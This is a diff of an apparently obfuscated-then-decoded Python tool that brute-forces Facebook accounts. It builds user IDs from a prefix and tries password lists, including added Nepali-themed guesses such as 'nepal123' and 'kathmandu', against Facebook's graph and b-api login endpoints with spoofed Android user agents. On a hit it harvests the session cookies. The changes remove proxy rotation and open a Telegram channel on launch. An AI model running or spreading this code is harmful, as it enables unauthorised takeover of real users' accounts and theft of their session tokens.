@@ -1,4 +1,5 @@
-#Decode by sumon
+#Decode by ArifSensei
+#Encode Cpython
 
 
 
@@ -1476,15 +1477,8 @@ def ua():
     samsung_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
     ua_ = random.choice([vivo_ua, infinix_ua, realme_ua, redmi_ua, oppo_ua, itel_ua, nokia_ua, samsung_ua])
     return ua_
-#-------------------------(PROXY)----------------------------#
-try:
-  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=th&proxy_format=protocolipport&format=text&timeout=20000').text
-  open('socksku.txt','w').write(proxylist)
-except Exception as e:
-  print(' server error')
-xvx=open('socksku.txt','r').read().splitlines()
 
-os.system("xdg-open")
+os.system("xdg-open https://t.me/Ariff_attackermen_Frome_lautan")
 os.system("clear")
     
 logo = """                                                               
@@ -1729,9 +1723,8 @@ def dev1():
         print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
-            uidd = kode+love
-            uid ='66' +uidd
-            pwx = [uidd[:6],uidd[:8],uidd,uidd[2:],uidd[4:]]
+            uid = kode+love
+            pwx = [uid+love,'tamang123 ','tamang1234','maya123','pokhara','nepal123','kathmandu123','pokhara123','kathmandu','tamang12345','nepal12345','nepal1234']
             if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
             elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
             elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
@@ -2294,9 +2287,7 @@ def bapi(uid, name, pwx, tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://b-api.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers)
-            print(f"Response: {result}")
-            print(f"Response Code: {result.status_code}")
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                 print(f" {green}[DEV-OK] {uid}|{pw}")
@@ -2407,14 +2398,12 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http':nip}
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
                 'device_id': str(uuid.uuid4()),
-                'email': '100080650416607',
-                'password': '620639',
+                'email': uid,
+                'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
@@ -2455,7 +2444,7 @@ def mbasic(uid,pwx,tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers,proxies=proxs).json()
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -2538,9 +2527,7 @@ def p(uid,pwx,tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://b-api.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers)
-            print(f"Response : {result}")
-            print(f"Response Code: {result.status_code}")
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
